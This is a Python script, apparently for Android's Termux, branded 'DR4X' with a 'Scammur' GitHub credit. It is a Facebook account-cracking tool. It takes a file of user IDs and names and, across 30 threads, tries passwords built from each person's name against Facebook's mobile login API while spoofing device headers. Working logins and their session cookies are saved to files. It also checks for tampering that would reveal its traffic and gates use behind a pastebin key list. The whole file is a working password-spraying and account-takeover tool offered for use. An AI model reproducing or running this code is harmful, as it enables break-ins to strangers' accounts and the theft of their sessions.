
import os
from os import system as sm
from time import sleep as sp
from concurrent.futures import ThreadPoolExecutor as ted
import uuid
import random 
import httpx
import json
import sys
import base64
import requests
import time
import asyncio
import aiohttp
os.system("clear")
print("\033[1;33m...CHECKING UPDATES....")
os.system("git pull")
sp(5)
async def bypass():
  file = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py','r')
  file2 = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py','r')
  file3 = open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py','r')
  data = file.read()
  sess = file2.read()
  approve = file3.read()
  keyword =("print(url)")
  keyword2 = ("print(data)")
  if keyword in data or "echo" in data or "pprint" in data:
    sm('clear')
    print(10*"\n\033[1;31mBYPASS???? HAHAHAHAHAHAHA NOOB")
    print("\n\033[1;33mBYE BYE FILES AHAHAHHAHA")
    exit()
  elif keyword in sess or "echo" in sess or keyword2 in sess or "pprint" in sess or "print(headers)" in sess or "{url}" in sess or "{data}" in sess or "{headers}" in sess or "Console" in sess or "rich" in sess or "exec" in sess or "sys.stdout.write" in sess:
    sm('clear')
    print(20*"\nCAPTURE DATA????? NOOB KID")
    print("\n\033[1;31mBYE BYE FILES")
    exit()
  else:
    await key()
#----------logo----------#
def logo():
      logo=('''\033[1;33m 
██████╗░██████╗░░░██╗██╗██╗░░██╗
██╔══██╗██╔══██╗░██╔╝██║╚██╗██╔╝
██║░░██║██████╔╝██╔╝░██║░╚███╔╝░
██║░░██║██╔══██╗███████║░██╔██╗░
██████╔╝██║░░██║╚════██║██╔╝╚██╗
╚═════╝░╚═╝░░╚═╝░░░░░╚═╝╚═╝░░╚═╝
      ''')
      return logo
#----------clear----------#
xy = requests.get('https://api.ipify.org/').text
os.system('clear')
print('\r\r\r\33[1;33m              YOUR IP:\33[1;36m'+str(xy))
time.sleep(5)
def clear():
    os.system('clear')
    print(logo())
    print(42*'═')
    print(' \033[1;33mFB LINK : https://www.facebook.com/angbo.bomo.75 ')
    print(' GITHUB  : Scammur')
    print(' STATUS  : FREE')
    print(' VERSION : 3.1')
    print(' IP      : '+xy)
    print(42*'\033[1;32m═\033[0m')
#----------line----------#
def line():
    print(42*'\033[1;32m═')
#----------menu----------#
def main():
    clear()
    print(' [1] FILE CLONING ')
    print(' [0] EXIT ')
    line()
    try:
        option=input(' [??] CHOICE MENU : ')
        if option in ['1','01']:
            file()
        else:
            exit(' THANKS FOR USING ')
    except ValueError:
        option = "A"
#----------file----------#
def file():
    clear()
    filex=input(' [??] ENTER FILE PATH : ')
    try:
        fo=open(filex,'r').read().splitlines()
    except FileNotFoundError:
        print(' File not found !!');sp(2)
        file()
    except IsADirectoryError:
        print("\033[1;31mERROR!! THIS IS A FOLDER NOT A FILE!!")
        sp(3)
        file()
    clear()
    print("\r\033[1;36m CHOOSE METHOD\n\n [1] METHOD 1(slow)\n [2] METHOD 2(fast)")
    line()
    mthd = input('Select Method: ')
    clear()
    try:
        pas_limit=int(input(' [??] ENTER PASSWORD LIMIT (1-20) : '))
    except:
        pas_limit=1
    line()
    pas_list=[]
    for i in range(pas_limit):
        pasx=input(f' [??] ENTER PASSWORD {i+1} : ')
        pas_list.append(pasx)
    with ted(max_workers=30) as death:
        tl=str(len(fo))
        clear()
        print(' TOTAL ACCOUNT : '+tl)
        print(' USE AIRPLANE MODE FOR SPEED UP')
        line()
        print(' IDS & PASS & COOKIES SAVE IN\n /sdcard/DRAX-ALIVE.txt\n /sdcard/DRAX-COOKIES.txt')
        line()
        for user in fo:
            ids,names=user.split('|')
            passlist=pas_list
            if mthd == "1":
                death.submit(m1,ids,names,passlist)
            elif mthd == "2":
                death.submit(m2,ids,names,passlist)
            else:
                main()
    line()
    print(' THE PROCESS HAS BEEN COMPLETE')
    input(' PRESS ENTER TO BACK : ')
    main()
loop=0
oks=[]
cps=[]
#----------method------------#
def m1(ids,names,passlist):
    global oks,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            sys.stdout.write('\r\r\033[1;36m [PABLO ~ M1] %s| \033[1;32mALIVE\033[0m||\033[1;31mDEAD \033[1;32m%s\033[0m||\033[1;31m%s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={
              'adid': f'{uuid.uuid4()}', 
              'format': 'json', 
              'device_id': f'{uuid.uuid4()}', 
              'cpl': 'true', 
              'family_device_id': f'{uuid.uuid4()}', 
              'credentials_type': 'device_based_login_password', 
              'error_detail_type': 'button_with_disabled', 
              'source': 'device_based_login', 
              'email': ids, 
              'password': pas, 
              'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
              'generate_session_cookies': '1', 
              'meta_inf_fbmeta': '', 
              'advertiser_id': f'{uuid.uuid4()}', 
              'currently_logged_in_userid': '0', 
              'locale': 'en_US', 
              'client_country_code': 'US', 
              'method': 'auth.login', 
              'fb_api_req_friendly_name': 'authenticate', 
              'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
              'api_key': f'{str(uuid.uuid4()).replace("-","")}'
              
            }
            qp1a=f"QP1A.{random.randint(200000,999999)}.0{random.randint(10,99)}"
            buil=f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(20,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"
            build=random.choice([qp1a,buil])
            fbbb=random.randint(100000000,300000000)
            fbpnnn=random.choice(['FB4A','Orca-Android','MessengerLite'])
            if fbpnnn == "FB4A":
              fbpnn="katana"
            elif fbpnnn == "Orca-Android":
              fbpnn="orca"
            elif fbpnnn == "MessengerLite":
              fbpnn="mlite"
            fbccr=random.choice(['GLOBE','TNT','SMART','TM'])
            headers={
                    'User-Agent': f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; 404: Not Found Build/{build}) [FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(10000000,99999999)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}'+';FBBV/2'+str(random.randint(1000000,9999999))+';FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/'+fbccr+f';FBMF/samsung;FBBD/samsung;FBPN/com.facebook.{fbpnn};FBDV/SGH-T599N;FBSV/4.1.2;FBCA/armeabi-v7a:armeabi;]',
              'Content-Type': 'application/x-www-form-urlencoded', 
              'Host': 'graph.facebook.com', 
              'X-FB-Net-HNI': str(random.randint(10000,99999)), 
              'X-FB-SIM-HNI': str(random.randint(10000,99999)), 
              'X-FB-Connection-Type': 'MOBILE.LTE',
              'X-Tigon-Is-Retry': 'False',
              'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 
              'x-fb-device-group': str(random.randint(1000,9999)),
              'X-FB-Friendly-Name': 'ViewerReactionsMutation',  
              'X-FB-Request-Analytics-Tags': 'graphservice', 
              'X-FB-HTTP-Engine': 'Liger', 
              'X-FB-Client-IP': 'True', 
              'X-FB-Server-Cluster': 'True', 
              'x-fb-connection-token': str(uuid.uuid4()).replace('-','')  
              
            }
            url='https://graph.facebook.com/auth/login'
            req=requests.post(url,data=data,headers=headers).json()
            if 'session_key' in req:
                coki = ";".join(i["name"]+"="+i["value"] for i in req["session_cookies"])
                print('\r\r \033[1;32m[ALIVE] '+ids+'|'+pas)
                print('\r\r \033[1;33m[FB-LINK]\033[1;34m https://www.facebook.com/'+ids)
                print('\033[1;32m [COOKIES] \033[1;36m'+coki)
                open('/sdcard/DR4X-ALIVE.txt','a').write(ids+' ^ '+pas+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                #print('\r\r\033[1;31m [CHECKPOINT] '+ids+'|'+pas)
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
def m2(ids,names,passlist):
    global oks,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            sys.stdout.write('\r\r\033[1;36m [PABLO ~ M2] %s| \033[1;32mALIVE\033[0m||\033[1;31mDEAD \033[1;32m%s\033[0m||\033[1;31m%s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={
              'adid': f'{uuid.uuid4()}', 
              'format': 'json', 
              'device_id': f'{uuid.uuid4()}', 
              'cpl': 'true', 
              'family_device_id': f'{uuid.uuid4()}', 
              'credentials_type': 'device_based_login_password', 
              'error_detail_type': 'button_with_disabled', 
              'source': 'device_based_login', 
              'email': ids, 
              'password': pas, 
              'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
              'generate_session_cookies': '1', 
              'meta_inf_fbmeta': '', 
              'advertiser_id': f'{uuid.uuid4()}', 
              'currently_logged_in_userid': '0', 
              'locale': 'en_US', 
              'client_country_code': '', 
              'method': 'auth.login', 
              'fb_api_req_friendly_name': 'authenticate', 
              'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 
              'api_key': f'62f8ce9f74b12f84c123cc23437a4a32'
              
            }
            build=f"{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(10,99)}{random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}"
            fbbb = random.randint(200000000,300000000)
            fbob = random.randint(200000000,300000000)
            qp1a = f"QP1A.{random.randint(100000,200000)}.0{random.randint(10,25)}"
            fbpnnn=random.choice(['FB4A','Orca-Android','MessengerLite'])
            if fbpnnn == "FB4A":
              fbpnn="katana"
            elif fbpnnn == "Orca-Android":
              fbpnn="orca"
            elif fbpnnn == "MessengerLite":
              fbpnn="mlite"
            builld = random.choice([build,qp1a])
            fbccr=random.choice(['TM','GLOBE','SMART','TNT'])
            headers={
                    'User-Agent': f"[FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,80000000)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(1000000,9999999))+";FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/TM;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.%s;FBDV/D5803;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"%(fbpnn)+f" [FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,99999999)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(1000000,9999999))+";FBDM/{density=2.0,width=720,height=1200};FBLC/en_US;FBCR/GLOBE;FBMF/LGE;FBBD/MetroPCS;FBPN/com.facebook.%s;FBDV/LGMS631;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"%(fbpnn)+f" [FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,99999999)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(1000000,9999999))+";FBDM/{density=3.0,width=1080,height=1776};FBLC/en_US;FBCR/TM;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.%s;FBDV/C6602;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"%(fbpnn),
              'Content-Type': 'application/x-www-form-urlencoded', 
              'Host': 'graph.facebook.com', 
              'X-FB-Net-HNI': str(random.randint(10000,99999)), 
              'X-FB-SIM-HNI': str(random.randint(10000,99999)), 
              'X-FB-Connection-Type': 'MOBILE.LTE',
              'X-Tigon-Is-Retry': 'False',
              'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 
              'x-fb-device-group': str(random.randint(1000,9999)),
              'X-FB-Friendly-Name': 'ViewerReactionsMutation',  
              'X-FB-Request-Analytics-Tags': 'graphservice', 
              'X-FB-HTTP-Engine': 'Liger', 
              'X-FB-Client-IP': 'True', 
              'X-FB-Server-Cluster': 'True', 
              'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
              
            }
            url='https://graph.facebook.com/auth/login'
            req=requests.post(url,data=data,headers=headers).json()
            if 'session_key' in req:
                coki = ";".join(i["name"]+"="+i["value"] for i in req["session_cookies"])
                print('\r\r \033[1;32m[ALIVE] '+ids+'|'+pas)
                print('\r\r \033[1;33m[FB-LINK] \033[1;34mhttps://www.facebook.com/'+ids)
                print('\033[1;32m [COOKIES] \033[1;36m'+coki)
                open('/sdcard/DR4X-ALIVE.txt','a').write(ids+' ^ '+pas+'\n')
                open('/sdcard/DRAX-COOKIES.txt','a').write(ids+" >> "+pas+" >> "+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                #print('\r\r\033[1;31m [CHECKPOINT] '+ids+'|'+pas)
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
async def login():
  check=requests.get("https://pastebin.com/raw/Nr9LuZ4u").text
  clear()
  logo()
  login=input("\033[1;36mEnter Your Username: \033[1;31m")
  if login == "mrdeath":
    await main()
  elif login == "ayesha":
    await bypass()
  else:
    sys.exit()
#key
ah="xD4RK-"
imt="-M4786=="
ak=" DR4X-"
myid=uuid.uuid4().hex[:10].upper()

try:
  key1=open('/data/data/com.termux/files/usr/bin/exca.txt', 'r').read()
except:
  kok=open('/data/data/com.termux/files/usr/bin/exca.txt', 'w')
  kok.write(myid+imt)
  kok.close()
async def key():
  #r1=str(urlopen("https://pastebin.com/raw/zg0D9N7Y").read())
  key1=open('/data/data/com.termux/files/usr/bin/exca.txt', 'r').read()
  clear()
  logo()
  async with aiohttp.ClientSession() as sess:
    async with sess.get('https://pastebin.com/raw/hnHX2J8B') as appro:
      r1 = await appro.text()
      if key1 in r1:
        os.system('clear')
        print("\033[1;32mYour Key Is Approved[/]")
        sp(3)
        main()
      else:
        clear()
        print("\t \033[1;32m First Get Approval\033[1;37m ")
        time.sleep(5)
        clear()
        print ("")
        print(" YOU HAVE TO GET APPROVE FIRST BEFORE USING IT")
        print ("")
        print(" Your Key is Not Approved ")
        print("")
        print (" Your Key : "+ak+ah+key1 )
        print ("")
        input(" Press Enter To Send Key")
        time.sleep(3.5)
        os.system('xdg-open https://www.messenger.com/t/100065316414713') 

#--end--
#
asyncio.run(bypass())
#main()